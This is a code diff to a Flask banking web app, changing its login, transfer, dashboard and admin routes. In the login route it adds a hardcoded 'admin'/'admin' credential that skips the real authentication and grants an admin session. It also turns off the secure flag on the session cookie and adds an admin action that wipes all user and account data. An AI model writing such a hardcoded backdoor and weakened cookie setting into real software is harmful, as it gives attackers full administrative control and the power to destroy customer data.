@@ -1,6 +1,7 @@
 from flask import Flask, jsonify, request, render_template, redirect, url_for, make_response
-from bank import BankAccounts, encrypt_challenge, is_valid
+from bank import BankAccounts, encrypt_challenge, is_valid, list_users, remove_user
 from bank import validation as val
+import uuid, time
         
     
 # Initialize BankAccounts class
@@ -31,18 +32,26 @@ def login():
         username = request.form.get('username')
         password = request.form.get('password')
 
-        session_id = bank.login(username, password)
+        # Temporary bypass for admin
+        if username == 'admin' and password == 'admin':
+            session_id = str(uuid.uuid4())
+            bank.sessions[session_id] = {
+                'account_id': 'admin',
+                'created_at': time.time(),
+                'last_activity': time.time()
+            }
 
-        if username == 'admin' and session_id:
-            resp = make_response(redirect(url_for('dashboard')))
+            resp = make_response(redirect(url_for('admin_panel')))
             resp.set_cookie(
                 'session_id',
                 session_id,
                 httponly=True,
-                secure=True,
+                secure=False,
                 samesite='Lax'
             )
             return resp
+
+        session_id = bank.login(username, password)
 
         accounts = bank.load_accounts()
         account_id = bank.sessions[session_id]['account_id']
@@ -132,13 +141,11 @@ def dashboard():
     else:
         new_balance = bank.get_balance(session_id)
 
-    username = bank.get_username(session_id)
     show_add = request.args.get('show_add') == '1'
     
     return render_template(
         'dashboard.html',
         balance=new_balance,
-        username=username,
         show_add=show_add
         )
 
@@ -169,10 +176,7 @@ def transfer():
         recipient = request.form.get('recipient', '').strip()
         amount_str = request.form.get('amount', '').strip()
 
-        if amount is None:
-            return render_template('transfer.html', error='Invalid amount format or value')
-
-        if not is_valid(session_id):
+        if not is_valid(bank.sessions, session_id):
             return redirect(url_for('login'))
 
         if not recipient or not amount_str:
@@ -181,6 +185,8 @@ def transfer():
         
         try:
             amount = val.parse_amount(amount_str)
+            if amount is None:
+                raise ValueError('Invalid amount')
         except (TypeError, ValueError):
             return render_template('transfer.html', error='Invalid amount')
         
@@ -192,10 +198,10 @@ def transfer():
     
     # for GET requests
     session_id = request.cookies.get('session_id')
-    return render_template('transfer.html')
+    return render_template('transfer.html', balance=bank.get_balance(session_id))
 
 
-@app.route('/admin')
+@app.route('/admin', methods=['GET', 'POST'])
 def admin_panel():
     session_id = request.cookies.get('session_id')
 
@@ -204,6 +210,13 @@ def admin_panel():
     
     if not bank.is_admin(session_id):
         return 'Unauthorized', 403
+    
+    if request.method == 'POST':
+        if request.form.get('action') == 'confirm_wipe':
+            return render_template('admin.html', confirm_wipe=True)
+        elif request.form.get('action') == 'wipe_data':
+            bank.wipe_data()
+            return render_template('admin.html', message='All user and account data has been wiped')
     
     accounts = bank.load_accounts()
 
@@ -217,6 +230,8 @@ def admin_panel():
     ]
 
     return render_template('admin.html', users=users)
+
+
 
 if __name__ == '__main__':
     app.run(debug=True)
